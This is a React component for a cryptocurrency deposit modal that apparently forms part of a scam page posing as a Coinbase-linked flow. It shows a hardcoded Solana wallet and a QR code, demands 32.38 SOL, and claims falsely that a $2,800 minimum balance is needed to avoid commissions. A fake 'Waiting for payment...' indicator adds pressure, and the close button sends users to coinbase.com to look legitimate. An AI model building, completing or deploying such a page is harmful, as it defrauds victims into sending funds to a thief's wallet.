"use client";

import { Copy, X } from "lucide-react";
import { useState } from "react";

const wallet = "AVL315ZjNhfzfPsSYAM1U3T1f9sXcEwfKybbZWk5EBTY";

export default function DepositStep() {
  const [copied, setCopied] = useState(false);

const copyWallet = async () => {
  try {
    await navigator.clipboard.writeText(wallet);
  } catch {
    const textArea = document.createElement("textarea");
    textArea.value = wallet;
    document.body.appendChild(textArea);
    textArea.select();
    document.execCommand("copy");
    document.body.removeChild(textArea);
  }

  setCopied(true);
  setTimeout(() => setCopied(false), 1200);
};

  return (
<div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">

      <div className="relative w-full max-w-[460px] rounded-[22px] bg-[#202127] px-[28px] pb-[28px] pt-[26px] shadow-2xl">

        {/* Close */}
        <button
  onClick={() => {
    window.location.href = "https://www.coinbase.com";
  }}
  className="absolute right-[22px] top-[22px] text-white/80"
>
  <X size={24} />
</button>

        {/* Title */}
        <h1 className="mb-[20px] text-[24px] font-[700] text-center">
          Add crypto to your account 
        </h1>

<div className="mb-[18px] rounded-[12px] border border-[#2f3541] bg-[#14151a] px-[14px] py-[12px]">
  <p className="text-[13px] font-[600] text-[#facc15]">
    To avoid commissions that would deplete your funds, 
    it is necessary to have a minimum balance of $2,800 in your account.

  </p>
</div>

        {/* Solana badge */}
        <div className="mb-[18px] flex justify-center">
          <div className="flex items-center gap-[10px] rounded-full bg-[#14151a] px-[16px] py-[8px]">
            <img
  src="/solana.png"
  alt="Solana"
  className="h-[18px] w-[18px]"
/>
            <span className="text-[14px] font-[700]">Solana (SOL)</span>
          </div>
        </div>

        {/* QR IMAGE */}
        <div className="mb-[20px] flex justify-center">
          <img
            src="/qr-code.png" // 👉 cambia este archivo en /public
            alt="QR"
            className="h-[220px] w-[220px] rounded-[16px] bg-white p-[10px]"
          />
        </div>

        <p className="mb-[16px] text-center text-[14px] text-[#a1a1aa]">
          Scan or send 32.38 SOL to this address
        </p>

        {/* Wallet */}
        <div className="mb-[16px] rounded-[12px] border border-white/10 bg-[#18191f] px-[16px] py-[14px]">
          <div className="flex items-center gap-[10px]">
            <p className="flex-1 truncate text-[14px] font-[600]">
              {wallet}
            </p>

            <button
              onClick={copyWallet}
              className="grid h-[38px] w-[38px] place-items-center rounded-full bg-[#2f3036]"
            >
              <Copy size={16} />
            </button>
          </div>
        </div>

        {/* Waiting */}
        <div className="mb-[18px] flex items-center justify-center gap-[8px] text-[13px]">
          <span className="h-[8px] w-[8px] animate-pulse rounded-full bg-green-400" />
          <span className="text-[#9ca3af]">Waiting for payment...</span>
        </div>

        {/* Button */}
        <button className="h-[52px] w-full rounded-full bg-[#5888ff] text-[15px] font-[700] text-black">
           Add funds to proceed 
        </button>

        {copied && (
          <p className="mt-[10px] text-center text-[12px] text-[#9ca3af]">
            Wallet copied
          </p>
        )}
      </div>
    </div>
  );
}